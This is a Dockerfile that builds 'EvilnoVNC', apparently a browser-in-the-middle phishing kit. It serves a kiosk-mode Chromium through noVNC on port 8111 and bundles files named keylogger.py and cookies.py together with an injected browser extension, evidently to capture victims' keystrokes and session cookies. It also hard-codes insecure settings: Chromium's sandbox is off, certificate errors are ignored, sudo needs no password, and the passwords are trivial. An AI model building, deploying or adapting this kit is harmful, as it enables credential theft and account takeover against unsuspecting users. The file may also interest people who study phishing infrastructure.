FROM alpine:latest

LABEL maintainer="JoelGMSec https://darkbyte.net, customized by ms101"

ENV DISPLAY=:0
ENV XAUTHORITY=~/.Xauthority

RUN apk update
#RUN apk add alpine-conf sudo bash xvfb xdpyinfo lightdm-gtk-greeter x11vnc chromium python3 py3-pip git openssl curl gcc libc-dev python3-dev php socat python3-tkinter
RUN apk add sudo bash strace tzdata xvfb xdpyinfo x11vnc xdotool chromium python3 py3-pip git openssl curl python3-dev php83 php83-openssl socat python3-tkinter
RUN rm -rf /usr/bin/python && ln -s /usr/bin/python3 /usr/bin/python
# define timezone
RUN ln -s /usr/share/zoneinfo/Europe/Berlin /etc/localtime

# PROD:
RUN echo 'CHROMIUM_FLAGS="--kiosk --chrome-frame --window-size=1280,720 --window-position=0,0 --no-first-run --enable-experimental-extension-apis --disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --no-sandbox --password-store=basic --start-fullscreen --noerrdialogs --load-extension=/home/user/extension/,/home/user/kiosk/ --ignore-certificate-errors"' >> /etc/chromium/chromium.conf
# TEST (show Chromium GUI + DevTools):
#RUN echo 'CHROMIUM_FLAGS="--window-size=1280,720 --window-position=0,0 --no-first-run --enable-experimental-extension-apis --disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --no-sandbox --password-store=basic --noerrdialogs --load-extension=/home/user/extension/,/home/user/kiosk/ --ignore-certificate-errors --auto-open-devtools-for-tabs --guest"' >> /etc/chromium/chromium.conf

#RUN mkdir -p /var/lib/dbus && dbus-uuidgen > /var/lib/dbus/machine-id
RUN chmod 777 /etc/chromium/
RUN chmod 666 /etc/chromium/chromium.conf

RUN adduser -h /home/user -s /bin/bash -S -D user && \
    echo "user:false" | chpasswd && \
    echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

USER user
WORKDIR /home/user

RUN mkdir -p /home/user/.vnc && x11vnc -storepasswd false /home/user/.vnc/passwd && \
    git clone --depth=1 https://github.com/novnc/noVNC.git /home/user/noVNC && \
    git clone --depth=1 https://github.com/novnc/websockify /home/user/noVNC/utils/websockify && \
    rm -rf /home/user/noVNC/.git && \
    rm -rf /home/user/noVNC/utils/websockify/.git && \
    sudo apk del git

COPY Files/server.sh /home/user/
COPY Files/startVNC.sh /home/user/
COPY Files/kiosk.sh /home/user/
COPY Files/cookies.py /home/user/
COPY Files/keylogger.py /home/user/
COPY Files/vnc_lite.html /home/user/noVNC/
COPY Files/cursor.js /home/user/noVNC/core/util/
COPY Files/keyboard.js /home/user/noVNC/core/input/
RUN sed -i 's/rgb(40, 40, 40)/white/' /home/user/noVNC/core/rfb.js
RUN sed -i 's/qualityLevel = 6/qualityLevel = 9/' /home/user/noVNC/core/rfb.js
RUN sed -i 's/compressionLevel = 2/compressionLevel = 0/' /home/user/noVNC/core/rfb.js
RUN sed -i 's/tabIndex = -1/tabIndex = 1/' /home/user/noVNC/core/rfb.js
COPY Files/ui.js /home/user/noVNC/app/
COPY Files/kiosk.zip /home/user/
COPY Files/index.php /home/user/

RUN mkdir /home/user/extension/
COPY Files/manifest.json /home/user/extension/
COPY Files/content.js /home/user/extension/

ENTRYPOINT ["/bin/bash","-c", "\
            EvilnoVNC () { \
                ./server.sh \"$@\"; \
            }; \"$@\"", "foo"]

EXPOSE 8111
CMD ["EvilnoVNC"]
